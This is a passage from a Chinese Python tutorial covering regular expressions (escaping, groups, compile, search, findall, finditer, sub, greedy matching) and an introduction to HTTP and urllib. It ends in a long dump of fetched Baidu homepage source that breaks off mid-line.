<p>例如：<br>我想打印这样一个字符串hello\world<br><figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">str</span>=<span class="string">"hello\world"</span></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">str</span>)</span><br></pre></td></tr></table></figure><br>这个字符串如果用在正则当中，就会因为w是特殊字母，加了\后，会被正则解释为\w，也就是匹配字母，导致错误。<br><figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">str</span>=<span class="string">"hello\\world"</span></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">str</span>)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">hello\world</span><br></pre></td></tr></table></figure><br>在特殊符号前加上\将其转义，就能正常输出啦</p>
<p>当然，为了防止漏写或错写还可以采用在字符串前加上r，意思就是输出原生字符串<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str=<span class="string">r"hello\world"</span></span><br><span class="line">print(str)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">hello\world</span><br></pre></td></tr></table></figure><br>在r控制的字符串中，所有特殊字符都会被当成普通字符来输出</p>
<h2 id="匹配分组"><a href="#匹配分组" class="headerlink" title="匹配分组"></a>匹配分组</h2><p>这个方法最常用在邮箱匹配中，常规的正则只能匹配一种类型的邮箱，想要匹配多种类型的邮箱，就可以采用分组来实现</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>符号</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>竖线</td>
<td>连接多个表达式，表达式之间是“或”的关系</td>
<td></td>
</tr>
<tr>
<td>()</td>
<td>将括号中字符作为一个分组</td>
<td></td>
</tr>
<tr>
<td>\NUM</td>
<td>结合()分组使用，引用分组NUM对应的匹配规则</td>
<td></td>
</tr>
<tr>
<td>(?P&lt; name&gt;)</td>
<td>给分组起名</td>
<td></td>
</tr>
<tr>
<td>(?P=name)</td>
<td>根据组名使用分组中的正则表达式</td>
<td></td>
</tr>
</tbody>
</table>
</div>
<p>例如：<br>匹配163，QQ，Outlook的邮箱<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rs1=re.match(<span class="string">r"\w&#123;4,10&#125;@(163|qq|outlook)\.com$"</span>,<span class="string">"python2018@163.com"</span>)</span><br><span class="line">print(rs1)</span><br><span class="line">rs2=re.match(<span class="string">r"\w&#123;4,10&#125;@(163|qq|outlook)\.com$"</span>,<span class="string">"12345@qq.com"</span>)</span><br><span class="line">print(rs2)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;_sre.SRE_Match object;span=(<span class="number">0</span>,<span class="number">18</span>),match=<span class="string">'python2018@163.com'</span>&gt;</span><br><span class="line">&lt;_sre.SRE_Match object;span=(<span class="number">0</span>,<span class="number">12</span>),match=<span class="string">'12345@qq.com'</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>匹配网页标签：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html_data=<span class="string">"&lt;head&gt;&lt;title&gt;python&lt;/titile&gt;&lt;/head&gt;"</span></span><br><span class="line">rs=re.match(<span class="string">r"&lt;.+&gt;&lt;.+&gt;.+&lt;/.+&gt;&lt;/.+&gt;"</span>,html_data)</span><br><span class="line">print(rs)</span><br></pre></td></tr></table></figure></p>
<p>给分组取别名：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html_data=<span class="string">"&lt;head&gt;&lt;titile&gt;python&lt;/titile&gt;&lt;/head&gt;"</span></span><br><span class="line">rs=re.match(<span class="string">r"&lt;(?P&lt;g1&gt;.+)&gt;&lt;(?P&lt;g2&gt;.+)&gt;.+&lt;/(?P=g2)&gt;&lt;/(?P=g1)&gt;"</span>,html_data)</span><br><span class="line">print(rs)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">36</span>), match=<span class="string">'&lt;head&gt;&lt;titile&gt;python&lt;/titile&gt;&lt;/head&gt;'</span>&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><p>为了方便开发者编写正则表达式，为其提供了很多操作正则表达式的内置函数</p>
<h3 id="compile函数"><a href="#compile函数" class="headerlink" title="compile函数"></a>compile函数</h3><p>这个函数类似于面向对象里面的复用技术</p>
<p>例如：<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">pattern=re.compile(<span class="string">"\w&#123;4,10&#125;@163\.com$"</span>)</span><br><span class="line">rs=re.<span class="keyword">match</span>(pattern,<span class="string">"python2018@163.com"</span>)</span><br><span class="line">print(rs)</span><br><span class="line">rs=re.<span class="keyword">match</span>(pattern,<span class="string">"vip_python@163.com"</span>)</span><br><span class="line">print(rs)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;re.<span class="type">Match</span> <span class="class"><span class="keyword">object</span></span>; span=(<span class="number">0</span>, <span class="number">18</span>), <span class="keyword">match</span>=<span class="symbol">'python2018</span>@<span class="number">163.</span>com'&gt;</span><br><span class="line">&lt;re.<span class="type">Match</span> <span class="class"><span class="keyword">object</span></span>; span=(<span class="number">0</span>, <span class="number">18</span>), <span class="keyword">match</span>=<span class="symbol">'vip_python</span>@<span class="number">163.</span>com'&gt;</span><br></pre></td></tr></table></figure><br>使用该函数可以让代码更简洁</p>
<h3 id="search函数"><a href="#search函数" class="headerlink" title="search函数"></a>search函数</h3><p>这个函数是从左到右在字符串的任意位置搜索第一个被正则匹配的子字符串</p>
<p>例如：<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">rs=re.search(<span class="string">"python"</span>,<span class="string">"hi python,i am going to study python"</span>)</span><br><span class="line">print(rs)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;re.<span class="type">Match</span> <span class="class"><span class="keyword">object</span></span>; span=(<span class="number">3</span>, <span class="number">9</span>), <span class="keyword">match</span>=<span class="symbol">'pytho</span>n'&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以看出第一个python在3，9之间，第二个python没有被匹配，说明search只能匹配一次，没有向后继续匹配</p>
<h3 id="findall函数"><a href="#findall函数" class="headerlink" title="findall函数"></a>findall函数</h3><p>findall函数是在字符串中查找正则表达式匹配成功的所有子字符串<br>例如：<br>从用户信息中查找出所有手机号<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">infos=<span class="string">"Tom:13800000001,David:13800000002"</span></span><br><span class="line">list=re.findall(<span class="string">r"1[3578]\d&#123;9&#125;"</span>,infos)</span><br><span class="line">print(list)</span><br><span class="line"></span><br><span class="line">输出结果为：</span><br><span class="line">[<span class="string">'13800000001'</span>, <span class="string">'13800000002'</span>]</span><br></pre></td></tr></table></figure></p>
<p>该函数的作用其实更像是search函数的升级版，它可以匹配出所有满足正则表达式的子字符串</p>
<h3 id="finditer函数"><a href="#finditer函数" class="headerlink" title="finditer函数"></a>finditer函数</h3><p>查找正则表达式匹配成功的所有子字符串，返回结果是一个可迭代的对象Iterator</p>
<p>例如：<br>从用户信息中查找出所有手机号<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">infos=<span class="string">"Tom:13800000001,David:13800000002"</span></span><br><span class="line">iter_obj=re.finditer(<span class="string">r"1[3578]\d&#123;9&#125;"</span>,infos)</span><br><span class="line"><span class="keyword">for</span> iter <span class="keyword">in</span> iter_obj:</span><br><span class="line">	print(iter.group())</span><br><span class="line">    </span><br><span class="line">输出结果为：</span><br><span class="line"><span class="number">13800000001</span></span><br><span class="line"><span class="number">13800000002</span></span><br></pre></td></tr></table></figure><br>这个函数更加方便，因为有迭代器的加入，使查看信息更加方便有效</p>
<h3 id="sub函数"><a href="#sub函数" class="headerlink" title="sub函数"></a>sub函数</h3><p>这个函数其实就是一个替换函数，将匹配到的字符串换成另一个字符串<br>例如：<br>将空格都换成逗号<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">stu</span>=<span class="string">"Tom 13800000001 Male"</span></span><br><span class="line">stu_new = re.sub(<span class="string">"\s"</span>,<span class="string">","</span>,stu)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"stu=&#123;&#125;"</span>.format(stu))</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"stu_new=&#123;&#125;"</span>.format(stu_new))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="attribute">stu</span>=Tom 13800000001 Male</span><br><span class="line"><span class="attribute">stu_new</span>=Tom,13800000001,Male</span><br></pre></td></tr></table></figure></p>
<h2 id="贪婪与非贪婪模式"><a href="#贪婪与非贪婪模式" class="headerlink" title="贪婪与非贪婪模式"></a>贪婪与非贪婪模式</h2><p>python中正则匹配默认是启用贪婪模式，也就是尽可能多的去匹配字符</p>
<p>非贪婪模式就是尽可能地少匹配字符<br>想要启动非贪婪模式只需要在“*,?,+,{m,n}”的后面加上一个<code>?</code></p>
<p>例如：<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">rs=re.findall(<span class="string">"python\d*?"</span>,<span class="string">"python2018"</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(rs)</span></span></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[<span class="string">'python'</span>]</span><br></pre></td></tr></table></figure></p>
<h1 id="Web编程"><a href="#Web编程" class="headerlink" title="Web编程"></a>Web编程</h1><p>Web编程又叫网络编程，是python中比较擅长的领域，内置了许多与网络编程有关的库，且第三方库十分丰富</p>
<h2 id="网络编程基础"><a href="#网络编程基础" class="headerlink" title="网络编程基础"></a>网络编程基础</h2><p>当今程序员在进行网络编程时，要按照C/S模式来开发，为了实现客户端和服务端在网络中正常运行，还要遵守HTTP网络传输协议</p>
<p>1.HTTP<br>即超文本传输协议的缩写，浏览器通过”http: //www”的方式访问的就是HTTP协议</p>
<p>2.URL<br>即统一资源定位符的缩写，也就是我们常熟的网址</p>
<p>3.HTTP请求，常见的有GET和POST请求</p>
<p>4.状态码<br>就是客户端请求HTTP之后，服务端返回给客户端的响应内容<br>    200:表示请求成功<br>   404:表示资源不存在<br>   500:表示服务器错误</p>
<h2 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h2><p>urllib库是python内置的HTTP请求库，下表是urllib库内置的模块</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>符号</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>urllib.request</td>
<td>HTTP请求模块，在程序中模拟浏览器发送的HTTP请求</td>
<td></td>
</tr>
<tr>
<td>urllib.error</td>
<td>异常处理模块，捕获由于HTTP请求问题产生的异常，并进行处理</td>
<td></td>
</tr>
<tr>
<td>urllib.parse</td>
<td>URL解析模块，提供了处理URL的工具函数</td>
<td></td>
</tr>
<tr>
<td>urllib.robotparser</td>
<td>robots.txt解析模块，网站通过robots.txt文件设置爬虫可爬取的网页</td>
<td></td>
</tr>
</tbody>
</table>
</div>
<h3 id="urllib-request-urlopen函数"><a href="#urllib-request-urlopen函数" class="headerlink" title="urllib.request.urlopen函数"></a>urllib.request.urlopen函数</h3><p>urllib库中的reaquest模块内置的urlopen函数用于向目标URL地址发送请求，返回一个HTTPRespoense类型对象，通过该对象获取响应内容：<br>    url:目标URL访问地址</p>
<p>   data:默认是None，表示以GET方式发送请求，如果改为以POST方式发送请求，需要传入data参数值</p>
<p>   timeout:访问超时时间，有时由于网络问题或者目标站点服务器处理请求时间较长，可能会产生超时异常，可以通过设置timeout参数延长超时时间</p>
<h4 id="发送GET请求"><a href="#发送GET请求" class="headerlink" title="发送GET请求"></a>发送GET请求</h4><p>以GET方式访问百度首页<br><figure class="highlight roboconf"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">response=urllib.request.urlopen("http://www.baidu.com")</span><br><span class="line">print(response.read().decode("utf8"))</span><br><span class="line"></span><br><span class="line">结果就是返回该首页的源码</span><br><span class="line">C:\Python38\python3.exe D:/TIM_DOWLOAD/233.py</span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"&gt;&lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"&gt;&lt;meta content="always" name="referrer"&gt;&lt;meta name="theme-color" content="<span class="comment">#2932e1"&gt;&lt;link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" /&gt;&lt;link rel="search" type="application/opensearchdescription+xml" href="/content-search.xml" title="百度搜索" /&gt;&lt;link rel="icon" sizes="any" mask href="//www.baidu.com/img/baidu_85beaf5496f291521eb75ba38eacbd87.svg"&gt;&lt;link rel="dns-prefetch" href="//dss0.bdstatic.com"/&gt;&lt;link rel="dns-prefetch" href="//dss1.bdstatic.com"/&gt;&lt;link rel="dns-prefetch" href="//ss1.bdstatic.com"/&gt;&lt;link rel="dns-prefetch" href="//sp0.baidu.com"/&gt;&lt;link rel="dns-prefetch" href="//sp1.baidu.com"/&gt;&lt;link rel="dns-prefetch" href="//sp2.baidu.com"/&gt;&lt;title&gt;百度一下，你就知道&lt;/title&gt;&lt;style type="text/css" id="css_index" index="index"&gt;body,html&#123;height:100%&#125;html&#123;overflow-y:auto&#125;body&#123;font:12px arial;background:#fff&#125;body,form,li,p,ul&#123;margin:0;padding:0;list-style:none&#125;#fm,body,form&#123;position:relative&#125;td&#123;text-align:left&#125;img&#123;border:0&#125;a&#123;text-decoration:none&#125;a:active&#123;color:#f60&#125;input&#123;border:0;padding:0&#125;.clearfix:after&#123;content:'\20';display:block;height:0;clear:both&#125;.clearfix&#123;zoom:1&#125;#wrapper&#123;position:relative;min-height:100%&#125;#head&#123;padding-bottom:100px;text-align:center;*z-index:1&#125;#ftCon&#123;height:50px;position:absolute;text-align:left;width:100%;margin:0 auto;z-index:0;overflow:hidden&#125;#ftConw&#123;display:inline-block;text-align:left;margin-left:33px;line-height:22px;position:relative;top:-2px;*float:right;*margin-left:0;*position:static&#125;#ftConw,#ftConw a&#123;color:#999&#125;#ftConw&#123;text-align:center;margin-left:0&#125;.bg&#123;background-image:url(http://ss.bdimg.com/static/superman/img/icons-5859e577e2.png);background-repeat:no-repeat;_background-image:url(http://ss.bdimg.com/static/superman/img/icons-d5b04cc545.gif)&#125;.c-icon&#123;display:inline-block;width:14px;height:14px;vertical-align:text-bottom;font-style:normal;overflow:hidden;background:url(http://ss.bdimg.com/static/superman/img/icons-5859e577e2.png) no-repeat 0 0;_background-image:url(http://ss.bdimg.com/static/superman/img/icons-d5b04cc545.gif)&#125;.c-icon-triangle-down-blue&#123;background-position:-480px -168px&#125;.c-icon-chevron-unfold2&#123;background-position:-504px -168px&#125;#m&#123;width:720px;margin:0 auto&#125;#lk,#nv a,#nv b,.btn&#123;font-size:14px&#125;#nv&#123;height:19px;font-size:16px;margin:0 0 4px;text-align:left;text-indent:137px&#125;#jgwab&#123;margin-left:19px&#125;#cp .c-icon-icrlogo,.c-icon-jgwablogo&#123;width:14px;height:17px;display:inline-block;overflow:hidden;background:url(http://ss.bdimg.com/static/superman/img/icons-5859e577e2.png) no-repeat;_background-image:url(http://ss.bdimg.com/static/superman/img/icons-d5b04cc545.gif)&#125;#cp .c-icon-icrlogo&#123;background-position:-600px -96px;position:relative;top:3px&#125;.c-icon-jgwablogo&#123;background-position:-623px -96px;position:relative;top:3px&#125;#shouji&#123;margin-right:14px&#125;#u&#123;display:none&#125;#c-tips-container&#123;display:none&#125;#wrapper&#123;min-width:1250px;height:100%;min-height:600px&#125;#head&#123;position:relative;padding-bottom:0;height:100%;min-height:600px&#125;#head #lg .index-logo-src,#head #lg .index-logo-srcnew&#123;position:absolute;bottom:10px;left:50%;margin-left:-135px&#125;#m&#123;position:relative&#125;#fm&#123;padding-left:40px;top:-37px&#125;#lh a&#123;margin-left:62px&#125;#lh #setf,#lh #seth&#123;margin-left:0&#125;#lk&#123;position:absolute;display:none;top:0;right:0;margin:33px 0&#125;#lk span&#123;font:14px "宋体"&#125;#nv&#123;position:absolute;display:none;top:0;right:0&#125;#lm&#123;color:#666;width:100%;height:60px;margin-top:60px;line-height:15px;font-size:13px;position:absolute;top:0;left:0&#125;#lm a&#123;color:#666&#125;#pad-version&#123;line-height:40px&#125;#su.bg,.s_btn_wr.bg,.s_ipt_wr.bg&#123;background-image:none&#125;#result_logo&#123;display:none&#125;#index_logo img&#123;display:inline-block;width:270px;height:129px&#125;#s_tab&#123;display:none&#125;.s_form_wrapper&#123;height:100%&#125;.s_form_wrapper.lite&#123;top:-191px&#125;#head .c-icon-bear-round&#123;display:none&#125;#fm .bdsug,#form .bdsug&#123;top:35px;z-index:100&#125;.bdsug&#123;display:none;position:absolute;width:538px;background:#fff;border:1px solid #ccc;_overflow:hidden;box-shadow:1px 1px 3px #ededed;-webkit-box-shadow:1px 1px 3px #ededed;-moz-box-shadow:1px 1px 3px #ededed;-o-box-shadow:1px 1px 3px #ededed&#125;.bdsug.bdsugbg ul&#123;background:url(http://ss.bdimg.com/static/superman/img/sugbg-1762fe7cb1.png) 100% 100% no-repeat;background-size:100px 110px;background-image:url(http://ss.bdimg.com/static/superman/img/sugbg-90fc9cf8c8.gif)\9&#125;.bdsug li&#123;width:522px;color:#000;font:14px arial;line-height:25px;padding:0 8px;position:relative;cursor:default&#125;.bdsug li.bdsug-s&#123;background:#f0f0f0&#125;.bdsug-store b,.bdsug-store span&#123;color:#7a77c8&#125;.bdsug-store-del&#123;font-size:12px;color:#666;text-decoration:underline;position:absolute;right:8px;top:0;cursor:pointer;display:none&#125;.bdsug-s .bdsug-store-del&#123;display:inline-block&#125;.bdsug-ala&#123;display:inline-block;border-bottom:1px solid #e6e6e6&#125;.bdsug-ala h3&#123;line-height:14px;background:url(//www.baidu.com/img/sug_bd.png) no-repeat left center;margin:8px 0 5px 0;font-size:12px;font-weight:400;color:#7b7b7b;padding-left:20px&#125;.bdsug-ala p&#123;font-size:14px;font-weight:700;padding-left:20px&#125;.bdsug .bdsug-direct&#123;width:auto;padding:0;border-bottom:1px solid #f1f1f1&#125;.bdsug .bdsug-direct p&#123;color:#00c;font-weight:700;line-height:34px;padding:0 8px;cursor:pointer;white-space:nowrap;overflow:hidden&#125;.bdsug .bdsug-direct p img&#123;width:16px;height:16px;margin:7px 6px 9px 0;vertical-align:middle&#125;.bdsug .bdsug-direct p span&#123;margin-left:8px&#125;.bdsug .bdsug-direct p i&#123;font-size:12px;line-height:100%;font-style:normal;font-weight:400;color:#fff;background-color:#2b99ff;display:inline;text-align:center;padding:1px 5px;*padding:2px 5px 0 5px;margin-left:8px;overflow:hidden&#125;.bdsug .bdsug-pcDirect&#123;color:#000;font-size:14px;line-height:30px;height:30px;background-color:#f8f8f8&#125;.bdsug .bdsug-pc-direct-tip&#123;position:absolute;right:15px;top:8px;width:55px;height:15px;display:block;background:url(../img/pc_direct.png) no-repeat 0 0&#125;.bdsug li.bdsug-pcDirect-s&#123;background-color:#f0f0f0&#125;.bdsug .bdsug-pcDirect-is&#123;color:#000;font-size:14px;line-height:22px;background-color:#f8f8f8&#125;.bdsug .bdsug-pc-direct-tip-is&#123;position:absolute;right:15px;top:3px;width:55px;height:15px;display:block;background:url(../img/pc_direct.png) no-repeat 0 0&#125;.bdsug li.bdsug-pcDirect-is-s&#123;background-color:#f0f0f0&#125;.bdsug .bdsug-pcDirect-is-s .bdsug-pc-direct-tip-is,.bdsug .bdsug-pcDirect-s .bdsug-pc-direct-tip&#123;background-position:0 -15px&#125;.bdsug .bdsug-newicon&#123;color:#929292;opacity:.7;font-size:12px;display:inline-block;line-height:22px;letter-spacing:2px&#125;.bdsug .bdsug-s .bdsug-newicon&#123;opacity:1&#125;.bdsug .bdsug-newicon i&#123;letter-spacing:0;font-style:normal&#125;.bdsug .bdsug-feedback-wrap&#123;text-align:right;background:#fafafa;color:#666;height:25px;line-height:25px;display:none&#125;.bdsug .bdsug-feedback&#123;margin-right:10px;text-decoration:underline;color:#666&#125;.toggle-underline&#123;text-decoration:none&#125;.toggle-underline:hover&#123;text-decoration:underline&#125;.tools&#123;position:absolute;right:-75px&#125;#mHolder&#123;width:62px;position:relative;z-index:296;display:none&#125;#mCon&#123;height:18px;line-height:18px;position:absolute;cursor:pointer&#125;#mCon span&#123;color:#00c;display:block;width:24px&#125;#mCon .hw&#123;text-decoration:underline;cursor:pointer;display:inline-block&#125;#mCon .pinyin&#123;display:inline-block&#125;#mCon .c-icon-chevron-unfold2&#123;margin-left:5px&#125;#mMenu a&#123;width:100%;height:100%;display:block;line-height:22px;text-indent:6px;text-decoration:none;filter:none\9&#125;#mMenu,#user ul&#123;box-shadow:1px 1px 2px #ccc;-moz-box-shadow:1px 1px 2px #ccc;-webkit-box-shadow:1px 1px 2px #ccc;filter:progid:DXImageTransform.Microsoft.Shadow(Strength=2, Direction=135, Color=#cccccc)\9&#125;#mMenu&#123;width:56px;border:1px solid #9b9b9b;list-style:none;position:absolute;right:27px;top:28px;display:none;background:#fff&#125;#mMenu a:hover&#123;background:#ebebeb&#125;#mMenu .ln&#123;height:1px;background:#ebebeb;overflow:hidden;font-size:1px;line-height:1px;margin-top:-1px&#125;#u1 a:link,#u1 a:visited&#123;color:#666;text-decoration:none&#125;#u1 a:active,#u1 a:hover&#123;text-decoration:underline&#125;#u1 a:active&#123;color:#00c&#125;#u1&#123;z-index:2;color:#fff;position:absolute;right:0;top:0;margin:19px 0 5px 0;padding:0 96px 0 0&#125;#u1 .reg&#123;display:none&#125;#u1 a.pf,#u1 a.pf:visited&#123;display:inline-block;float:left;color:#333;line-height:24px;font-size:13px;margin-left:20px;overflow:hidden;text-decoration:underline&#125;#u1 a.lb,#u1 a.lb:visited,#u1 a.username&#123;display:inline-block;float:left;color:#333;font-size:13px;line-height:24px;margin-left:20px;text-decoration:underline&#125;#u1 a.bri,#u1 a.bri:visited&#123;display:inline-block;position:absolute;right:10px;width:60px;height:23px;float:left;color:#fff;background:#38f;line-height:24px;font-size:13px;text-align:center;overflow:hidden;border-bottom:1px solid #38f;margin-left:19px;margin-right:2px&#125;#u1 a.bri.brihover&#123;display:none;text-decoration:none;color:#333;background:0 0;border-bottom:1px solid transparent;margin-left:19px&#125;#u1 #lm a&#123;color:#00c;text-decoration:underline&#125;#u1 a.mnav,#u1 a.mnav:visited&#123;float:left;color:#333;font-weight:700;line-height:24px;margin-left:20px;font-size:13px;text-decoration:underline&#125;#u1 a.lb:hover,#u1 a.mnav:hover,#u1 a.pf:hover&#123;color:#00c&#125;.briiconsbg&#123;background-repeat:no-repeat;background-size:300px 18px;background-image:url(http://ss.bdimg.com/static/superman/img/icons-5859e577e2.png);background-image:url(http://ss.bdimg.com/static/superman/img/icons-d5b04cc545.gif)\9&#125;.bdpfmenu&#123;background-color:#fff;border:1px solid #d1d1d1;position:absolute;right:160px;width:68px;top:36px;margin-top:-1px;_margin-top:-3px;z-index:2;box-shadow:1px 1px 5px #d1d1d1;-webkit-box-shadow:1px 1px 5px #d1d1d1;-moz-box-shadow:1px 1px 5px #d1d1d1;-o-box-shadow:1px 1px 5px #d1d1d1&#125;.bdpfmenu a&#123;display:block;text-align:left;margin:0!important;padding:0 9px;line-height:26px;text-decoration:none&#125;#wrapper .bdpfmenu a:link,#wrapper .bdpfmenu a:visited&#123;background:#fff;color:#333&#125;#wrapper .bdpfmenu a:active,#wrapper .bdpfmenu a:hover&#123;background:#38f;text-decoration:none;color:#fff&#125;#wrapper .bdnuarrow&#123;width:0;height:0;font-size:0;line-height:0;display:block;position:absolute;top:-10px;left:50%;margin-left:-5px&#125;#wrapper .bdnuarrow em,#wrapper .bdnuarrow i&#123;width:0;height:0;font-size:0;line-height:0;display:block;position:absolute;border:5px solid transparent;border-style:dashed dashed solid dashed&#125;#wrapper .bdnuarrow em&#123;border-bottom-color:#d8d8d8;top:-1px&#125;#wrapper .bdnuarrow i&#123;border-bottom-color:#fff;top:0&#125;.s-isindex-wrap #wrapper .bdnuarrow&#123;height:13px;background:url(http://ss.bdimg.com/static/superman/img/icons-5859e577e2.png) no-repeat -90px -1px&#125;#wrapper .bdnuarrow.bdbriarrow&#123;right:104px;display:none!important&#125;#wrapper .bdbri&#123;width:85px;min-height:100px;border-left:1px solid #e7e7e7;position:absolute;background-color:#f9f9f9;overflow:hidden;z-index:10;right:0;top:0&#125;#prefpanel&#123;background:#fafafa;display:none;opacity:0;position:fixed;_position:absolute;top:-359px;z-index:1000;width:100%;min-width:960px;border-bottom:1px solid #ebebeb&#125;#prefpanel form&#123;_width:850px&#125;#wrapper .bdbriimgtitle&#123;color:#333;text-align:center;width:66px;height:43px;line-height:43px;padding-top:9px;margin:0 auto;border-bottom:#f0f0f0 1px solid;font-size:13px;cursor:default&#125;#wrapper .briscrollwrapper&#123;overflow:hidden&#125;#wrapper .briscrollwrapperContainer&#123;position:relative&#125;#wrapper .bdbri.bdbriimg .bdmainlink a,#wrapper .bdbri.bdbriimg .bdothlink a&#123;display:block;text-align:center;width:66px;height:76px;margin:0 auto;border-bottom:#f0f0f0 1px solid;color:#666;text-decoration:none;overflow:hidden&#125;#wrapper .bdbri.bdbriimg .bdmainlink a:visited,#wrapper .bdbri.bdbriimg .bdothlink a:visited&#123;color:#666&#125;#wrapper .bdbri.bdbriimg .bdmainlink a:hover,#wrapper .bdbri.bdbriimg .bdothlink a:hover&#123;color:#666;text-decoration:underline&#125;#wrapper .bdbri.bdbriimg .bdmainlink a:active,#wrapper .bdbri.bdbriimg .bdothlink a:active&#123;color:#00c;text-decoration:underline&#125;#wrapper .bdbri.bdbriimg span&#123;width:36px;height:36px;display:block;margin:10px auto 5px;background:url(http://ss.bdimg.com/static/superman/img/logos/bdbri_icons.png) no-repeat;cursor:pointer&#125;#wrapper .bdbri.bdbriimg .bdbrievenmore,#wrapper .bdbri.bdbriimg .bdbrimore&#123;clear:both;text-align:center&#125;#wrapper .bdbri.bdbriimg .bdbrievenmore&#123;margin-top:15px;height:30px;width:85px;overflow:hidden&#125;#wrapper .bdbri.bdbriimg span.bdbriimgitem_1&#123;background:url(http://ss.bdimg.com/static/superman/img/logos/yingxiao-b585c1ec7d.png) no-repeat;background-size:cover&#125;#wrapper .bdbri.bdbriimg span.bdbriimgitem_2&#123;background:url(http://ss.bdimg.com/static/superman/img/logos/zhidao-cbf2affcac.png) no-repeat;background-size:cover&#125;#wrapper .bdbri.bdbriimg span.bdbriimgitem_3&#123;width:36px;background:url(http://ss.bdimg.com/static/superman/img/logos/qqjt-9809ca806e.png) no-repeat;background-size:cover&#125;#wrapper .bdbri.bdbriimg span.bdbriimgitem_4&#123;background:url(http://ss.bdimg.com/static/superman/img/logos/image-55b5909a30.png) no-repeat;background-size:cover&#125;#wrapper .bdbri.bdbriimg span.bdbriimgitem_5&#123;background:url(http://ss.bdimg.com/static/superman/img/logos/wenku-aaf198d89f.png) no-repeat;background-size:cover&#125;#wrapper .bdbri.bdbriimg span.bdbriimgitem_6&#123;background:url(http://ss.bdimg.com/static/superman/img/logos/fengyunbang-1986a40079.png) no-repeat;background-size:cover&#125;#wrapper .bdbri.bdbriimg span.bdbriimgitem_7&#123;background-position:-220px 0&#125;#wrapper .bdbri.bdbriimg .bdbrievenmore a:link,#wrapper .bdbri.bdbriimg .bdbrievenmore a:visited&#123;color:#666;text-decoration:underline&#125;#wrapper .bdbri.bdbriimg .bdbrievenmore a:hover&#123;color:#666;text-decoration:underline&#125;#wrapper .bdbri.bdbriimg .bdbrievenmore a:active&#123;color:#00c&#125;.bdbriscroll-ctrl-scroll&#123;position:absolute;top:10px;right:1px;width:8px;border-top:1px solid #e4e4e4;border-left:1px solid #e4e4e4;cursor:default;-webkit-user-select:none;-moz-user-select:none&#125;.bdbriscroll-ctrl-scroll .bdbriscroll-axis&#123;width:8px;left:0;z-index:0;position:absolute;background:#f2f2f2&#125;.bdbriscroll-ctrl-scroll-touch .bdbriscroll-axis&#123;width:7px;background:#f2f2f2&#125;.bdbriscroll-ctrl-scroll-hover .bdbriscroll-axis&#123;background:#f2f2f2&#125;.bdbriscroll-ctrl-scroll .bdbriscroll-slider&#123;overflow:hidden;width:7px;height:14px;position:absolute;left:0;z-index:10;display:none;background:#d9d9d9;margin-top:-1px;margin-left:-1px;border-right:1px solid #cecece;border-bottom:1px solid #cecece;cursor:default&#125;.bdbriscroll-ctrl-scroll-hover .bdbriscroll-slider,.bdbriscroll-ctrl-scroll-touch .bdbriscroll-slider&#123;background:#b8b8b8;border-right:1px solid #afafaf;border-bottom:1px solid #afafaf&#125;.s_ipt::-webkit-input-placeholder&#123;padding-left:3px;color:#aaa;font-size:13px&#125;.s_ipt::-moz-placeholder&#123;padding-left:3px;color:#aaa;font-size:13px&#125;.s_ipt:-ms-input-placeholder&#123;padding-left:3px;color:#aaa;font-size:13px&#125;.s_ipt::placeholder&#123;padding-left:3px;color:#aaa;font-size:13px&#125;.kw-placeholder&#123;position:absolute;top:0;left:0;color:#aaa;font-size:13px;height:35px;line-height:35px;padding-left:10px;max-width:360px;z-index:99;pointer-events:none&#125;.kw-placeholder.placeholders-hidden&#123;visibility:hidden&#125;.qrcode-chunwan&#123;width:530px;height:90px;position:absolute;left:50%;margin-left:-265px;z-index:1;bottom:115px;background-size:100%;background-repeat:no-repeat;background-position:center&#125;.qrcode-chunwan .close-chunwan&#123;width:23px;height:23px;position:absolute;top:0;right:0;display:none;_display:block;background-size:100%&#125;.qrcode-chunwan:hover .close-chunwan&#123;display:block&#125;.s-skin-hasbg #head_wrapper.s-down .s_ipt:focus&#123;border-top:1px solid #38f!important;border-left:1px solid #38f!important;border-bottom:1px solid 